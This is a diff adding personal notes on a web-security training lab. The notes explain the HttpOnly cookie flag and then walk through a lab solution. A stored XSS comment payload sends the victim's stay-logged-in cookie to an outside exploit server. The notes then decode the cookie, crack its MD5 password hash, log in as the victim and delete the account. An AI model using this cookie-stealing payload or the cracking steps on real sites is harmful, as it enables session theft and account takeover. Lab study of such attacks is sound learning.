@@ -1,0 +1,38 @@
+Offline password cracking
+Goal - Exploit XSS vulnerability to obtain Carlos's hashed password, crack it and delete his account.
+
+wiener:peter
+carlos
+
+stay-logged-in cookie is not set to http only:
+The HttpOnly flag on a cookie is a security feature that helps mitigate the risk of client-side
+script accessing the protected cookie data. Here's what it does:
+
+-Prevents JavaScript Access:
+When the HttpOnly flag is set on a cookie, it cannot be accessed or modified via JavaScript.
+This helps protect the cookie from cross-site scripting (XSS) attacks, where an attacker might
+inject malicious scripts to steal cookies.
+
+-Server-Side Access Only:
+The cookie is only accessible by the server through HTTP requests (e.g., during form submissions, AJAX requests, etc.).
+ This ensures that sensitive information stored in the cookie is not exposed to client-side scripts.
+
+ HTTP response header:
+ Set-Cookie: sessionId=abc123; HttpOnly
+
+ In asp.net the session cookie is set to HttpOnly by default, but **custom cookies are not**
+
+ 1)
+ -Login with your credentials
+ -Observe HttpOnly not set to true on stay logged in cookie
+ -Click on view post
+ -Leave a comment
+ <script>document.location='https://exploit-0a57007304b2399480d6f76c01b400c9.exploit-server.net/exploit'+document.cookie</script>
+-Click Post Comment
+-Grab 302 from exploit server
+-Decode, Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+-Grab password hash from decoded base64
+-Crack md5 hash, 26323c16d5f4dabff3bb136f2460a943
+-onceuponatime
+-Login
+-Delete account
